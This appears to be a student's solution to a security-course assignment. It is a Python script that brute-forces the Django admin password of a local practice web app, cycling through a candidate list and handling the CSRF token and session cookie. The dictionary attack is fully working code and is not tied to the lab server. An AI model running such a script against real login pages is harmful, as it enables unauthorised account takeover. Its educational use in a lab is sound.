"""
TO DO
The assignment template contains a small web application that needs to be hacked.

Your "friend" forgot his admin password, and you need to "retrieve it". The account username is admin and since your friend isn't the sharpest tool in the shed, you suspect that he uses a popular password. The candidate passwords are listed in candidates.txt and the list is taken from https://github.com/danielmiessler/SecLists/tree/master/Passwords.

To access the admin panel go to http://localhost:8000/admin/login/?next=/admin/ once you have fired up the server.

Use requests.Session() to probe the server (otherwise a certain cookie is not transmitted). You will also need to deal with csrf token. Use the provided helper function to extract the token. The template also provides a function to check whether the login was successful.

Do not forget to submit all the relevant login form fields.
"""
import sys
import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
	requestSession = requests.Session()
	retrieveSession = requestSession.get(address + '/admin/login/?next=/admin/')
	token = extract_token(retrieveSession)
	for password in candidates:
		login_data = dict(username='admin', password=password, csrfmiddlewaretoken=token)
		retrieveSession = requestSession.post(address + '/admin/login/?next=/admin/', data=login_data, headers=dict(Referer=address + '/admin/login/?next=/admin/'))
		if (isloggedin(retrieveSession)):
			return password
	return retrieveSession


def main(argv):
	address = sys.argv[1]
	fname = sys.argv[2]
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, candidates))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s address filename' % sys.argv[0])
	else:
		main(sys.argv)
